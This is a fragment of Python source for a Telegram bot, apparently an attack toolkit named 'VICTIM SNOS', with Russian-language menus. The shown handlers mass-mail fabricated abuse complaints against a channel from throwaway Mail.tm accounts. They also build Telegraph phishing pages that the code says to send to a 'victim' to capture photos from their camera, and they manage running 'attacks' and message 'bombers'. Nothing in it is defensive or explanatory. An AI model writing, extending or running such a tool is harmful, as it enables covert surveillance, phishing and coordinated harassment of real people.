        "<b>📢 ЖАЛОБА НА КАНАЛ</b>\n\nВыберите тип нарушения:",
        get_mail_channel_menu()
    )
    await cb.answer()

@dp.callback_query(F.data.startswith("mailchan_"))
async def mail_chan_type(cb: types.CallbackQuery, state: FSMContext):
    complaint_type = cb.data.replace("mailchan_", "")
    await state.update_data(complaint_type=complaint_type)
    await state.set_state(MailChannelState.waiting_channel)
    await cb.message.delete()
    await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>📢 ЖАЛОБА НА КАНАЛ</b>\n\nВведите ссылку на канал:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="mail_chan")]])
    )

@dp.message(StateFilter(MailChannelState.waiting_channel))
async def mail_chan_link(msg: types.Message, state: FSMContext):
    channel = msg.text.strip()
    await state.update_data(channel=channel)
    await state.set_state(MailChannelState.waiting_violation)
    await msg.delete()
    await send_message_with_banner(msg, "🔗 Введите ссылку на нарушение (конкретный пост):")

@dp.message(StateFilter(MailChannelState.waiting_violation))
async def mail_chan_violation(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    channel = data.get("channel", "")
    violation = msg.text.strip()
    complaint_type = data.get("complaint_type", "8")
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    body = COMPLAINT_TEXTS_CHANNEL[complaint_type].format(
        channel_link=channel,
        violation_link=violation
    )
    
    st = await send_message_with_banner(msg, "<b>📧 Отправка писем...</b>")
    
    sent = await send_mass_complaint(
        mail_tm,
        "Жалоба на канал",
        body,
        user_id
    )
    
    await st.delete()
    await send_message_with_banner(
        msg,
        f"<b>✅ ЖАЛОБЫ ОТПРАВЛЕНЫ!</b>\n\n"
        f"📢 {channel}\n"
        f"📊 Отправлено писем: {sent}",
        get_main_menu()
    )

# Фишинг
@dp.callback_query(F.data == "phish_create")
async def phish_create_start(cb: types.CallbackQuery, state: FSMContext):
    await state.set_state(PhishState.waiting_link)
    await cb.message.delete()
    await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>🎣 СОЗДАНИЕ ФИШ-СТРАНИЦЫ</b>\n\n"
                "Отправьте ссылку на статью Telegraph (или 'нет' для создания новой):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="phish_menu")]])
    )

@dp.message(StateFilter(PhishState.waiting_link))
async def phish_link(msg: types.Message, state: FSMContext):
    link = msg.text.strip()
    if link.lower() != "нет" and "telegra.ph" not in link:
        await send_message_with_banner(msg, "❌ Нужна ссылка на Telegraph или 'нет'!")
        return
    
    await state.update_data(link=link if link.lower() != "нет" else None)
    await state.set_state(PhishState.waiting_title)
    await msg.delete()
    await send_message_with_banner(msg, "📝 Введите заголовок страницы:")

@dp.message(StateFilter(PhishState.waiting_title))
async def phish_title(msg: types.Message, state: FSMContext):
    title = msg.text.strip()
    await state.update_data(title=title)
    await state.set_state(PhishState.waiting_description)
    await msg.delete()
    await send_message_with_banner(msg, "📄 Введите описание:")

@dp.message(StateFilter(PhishState.waiting_description))
async def phish_description(msg: types.Message, state: FSMContext):
    description = msg.text.strip()
    await state.update_data(description=description)
    await state.set_state(PhishState.waiting_button)
    await msg.delete()
    await send_message_with_banner(msg, "🔘 Введите текст на кнопке:")

@dp.message(StateFilter(PhishState.waiting_button))
async def phish_button(msg: types.Message, state: FSMContext):
    button_text = msg.text.strip()
    data = await state.get_data()
    link = data.get("link")
    title = data["title"]
    description = data["description"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    st = await send_message_with_banner(msg, "<b>🎣 Создание страницы...</b>")
    
    connector = aiohttp.TCPConnector(limit=10, force_close=True, ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
        url = await create_phish_page(
            sess,
            link,
            user_id,
            title,
            description,
            button_text
        )
    
    await st.delete()
    
    if url:
        add_log(user_id, "Фишинг", url)
        await send_message_with_banner(
            msg,
            f"<b>✅ ФИШ-СТРАНИЦА СОЗДАНА!</b>\n\n"
            f"🔗 <code>{url}</code>\n\n"
            f"<i>Отправьте эту ссылку жертве. Когда она нажмет кнопку, вы получите фото с камеры!</i>",
            get_main_menu()
        )
    else:
        await send_message_with_banner(
            msg,
            "<b>❌ ОШИБКА</b>\n\nНе удалось создать страницу. Попробуйте позже.",
            get_main_menu()
        )

@dp.callback_query(F.data == "phish_list")
async def phish_list(cb: types.CallbackQuery):
    user_pages = [(i, d) for i, d in phish_pages.items() if d["chat_id"] == cb.from_user.id]
    
    if not user_pages:
        await edit_message_with_banner(
            cb,
            "<b>📋 МОИ ФИШ-ССЫЛКИ</b>\n\nУ вас пока нет созданных страниц.",
            InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ НАЗАД", callback_data="phish_menu")]])
        )
        await cb.answer()
        return
    
    text = "<b>📋 МОИ ФИШ-ССЫЛКИ</b>\n\n"
    for _, d in user_pages[-10:]:
        created = datetime.fromtimestamp(d['created']).strftime('%d.%m %H:%M')
        text += f"🔗 <code>{d['url']}</code>\n📅 {created}\n\n"
    
    await edit_message_with_banner(
        cb,
        text,
        InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ НАЗАД", callback_data="phish_menu")]])
    )
    await cb.answer()

@dp.callback_query(F.data == "stop")
async def stop(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    stopped = False
    
    if user_id in active_attacks:
        active_attacks[user_id]["stop_event"].set()
        del active_attacks[user_id]
        stopped = True
    
    if user_id in active_bombers:
        active_bombers[user_id]["stop_event"].set()
        del active_bombers[user_id]
        stopped = True
    
    if user_id in active_reports:
        del active_reports[user_id]
        stopped = True
    
    if stopped:
        await edit_message_with_banner(cb, "<b>⛔ ВСЕ ПРОЦЕССЫ ОСТАНОВЛЕНЫ</b>", get_main_menu())
    else:
        await edit_message_with_banner(cb, "<b>ℹ️ НЕТ АКТИВНЫХ ПРОЦЕССОВ</b>", get_main_menu())
    
    await cb.answer()

@dp.message(F.photo)
async def handle_photo(msg: types.Message):
    if msg.caption and "Жертва:" in msg.caption:
        m = re.search(r"Жертва: (\w+)", msg.caption)
        if m and m.group(1) in phish_pages:
            page = phish_pages[m.group(1)]
            await msg.reply(
                f"<b>📸 НОВОЕ ФОТО С КАМЕРЫ!</b>\n\n"
                f"🎯 Страница: {page['url']}\n"
                f"📅 Создана: {datetime.fromtimestamp(page['created']).strftime('%d.%m.%Y %H:%M')}"
            )
            add_log(msg.from_user.id, "Фишинг: фото", page['url'])


# ---------- ЗАПУСК ----------
mail_tm = MailTM()

async def init_mailtm():
    try:
        with open(MAILTM_ACCOUNTS_FILE, 'r') as f:
            mail_tm.accounts = json.load(f)
            mail_tm.ready = True
            logger.info(f"✅ Загружено {len(mail_tm.accounts)} почтовых аккаунтов")
    except:
        logger.info("📧 Создание почтовых аккаунтов Mail.tm...")
        await mail_tm.create_multiple_accounts(MAILTM_ACCOUNTS_COUNT)
        if mail_tm.accounts:
            with open(MAILTM_ACCOUNTS_FILE, 'w') as f:
                json.dump(mail_tm.accounts, f)
            mail_tm.ready = True
            logger.info(f"✅ Создано {len(mail_tm.accounts)} почтовых аккаунтов")

async def main():
    load_allowed_users()
    logger.info(f"🔥 VICTIM SNOS запускается...")
    logger.info(f"📱 Сессий на пользователя: {SESSIONS_PER_USER}")
    logger.info(f"🌐 OAuth сайтов: {len(TELEGRAM_OAUTH_SITES)}")
    logger.info(f"💣 Сайтов бомбера: {len(BOMBER_WEBSITES)}")
    
    await bot.delete_webhook(drop_pending_updates=True)
    asyncio.create_task(init_mailtm())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
